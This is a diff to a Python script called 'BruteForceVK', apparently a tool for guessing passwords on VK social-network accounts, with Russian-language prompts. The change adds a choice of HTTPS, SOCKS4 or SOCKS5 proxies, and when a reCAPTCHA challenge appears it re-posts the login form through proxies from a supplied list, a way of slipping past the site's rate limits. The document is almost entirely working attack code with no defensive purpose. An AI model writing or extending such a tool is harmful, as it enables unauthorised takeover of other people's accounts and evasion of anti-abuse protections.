@@ -5,10 +5,16 @@ import time
 init()
 
 print('BruteForceVK')
+print('Выберите тип используемых прокси')
+print('1. HTTPS')
+print('2. SOCKS4')
+print('3. SOCKS5')
+typepr = str(input('> '))
+print('BruteForceVK')
 print('Введите логин')
 login = str(input('> '))
 print('BruteForceVK')
-print('Введите https прокси-лист(он должен быть в одной папке с программой)')
+print('Введите прокси-лист(он должен быть в одной папке с программой)')
 prx = str(input('> '))
 lstprx = open(prx, 'r')
 rdprx = lstprx.readlines()
@@ -56,7 +62,12 @@ for proxy in rdprx:
             j.write(response.text)
             j.close()
         elif 'onLoginReCaptcha' in response.text:
-            proxiez = {'https' : 'https://' + proxy}
+            if typepr == '1':
+                proxiez = {'https' : 'https://' + proxy}
+            elif typepr == '2':
+                proxiez = {'https': 'socks4://' + proxy}
+            elif typepr == '3':
+            	proxiez = {'https': 'socks5://' + proxy}
             for proxy in rdprx:
                 try:
                     sss = session.post(form.action, data=form.form_values(), proxies = proxiez, timeout = out)
